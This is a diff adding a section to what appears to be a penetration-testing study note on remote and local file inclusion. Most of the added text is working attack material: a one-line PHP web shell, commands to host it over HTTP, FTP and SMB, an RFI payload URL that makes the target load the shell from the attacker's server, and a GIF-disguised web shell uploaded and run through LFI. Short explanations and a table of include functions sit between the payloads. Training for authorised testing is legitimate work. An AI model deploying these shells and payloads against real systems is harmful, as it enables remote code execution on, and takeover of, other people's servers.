@@ -106,3 +106,76 @@ It may not be ideal to include the vulnerable page itself (i.e. index.php) as th
 
 ## Remote Code Execution with RFI
 
+Start by creating a PHP shell
+
+```sh
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Host it via any of the following methods:
+## HTTP
+
+```sh
+sudo python3 -m http.server <LISTENING_PORT>
+```
+
+## FTP
+
+```sh
+sudo python -m pyftpdlib -p 21
+```
+
+## SMB
+
+```sh
+impacket-smbserver -smb2support share $(pwd)
+```
+
+**Example Payload:**
+
+```sh
+http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+```
+
+# LFI and File Uploads
+
+**What if the file upload function has code execution capabilities?** We can inject a PHP web shell code within the image instead of image data.
+
+| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
+| ---------------------------- | :--------------: | :---------: | :------------: |
+| **PHP**                      |                  |             |                |
+| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
+| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
+| **NodeJS**                   |                  |             |                |
+| `res.render()`               |        ✅         |      ✅      |       ❌        |
+| **Java**                     |                  |             |                |
+| `import`                     |        ✅         |      ✅      |       ✅        |
+| **.NET**                     |                  |             |                |
+| `include`                    |        ✅         |      ✅      |       ✅        |
+## Image upload
+#### Crafting Malicious Image
+
+Our first step is to create a malicious image containing a PHP web shell that still looks and works as an image (extension & magic number).
+
+```sh
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+#### Uploaded File Path
+
+After we upload the image, we have to find what path is used to store the image. In most cases, especially with images, we would get access to our uploaded image and can get its path from its URL.
+
+```html
+<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+```
+
+```ad-note
+As we can see, we can use `/profile_images/shell.gif` as our path. If we don't know where the file is uploaded then we can fuzz for an uploads directory, and then fuzz for our uploaded file. This might not always work as some applications properly hide the uploaded files.
+```
+
+```sh
+http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+```
+
+## Zip Upload
+
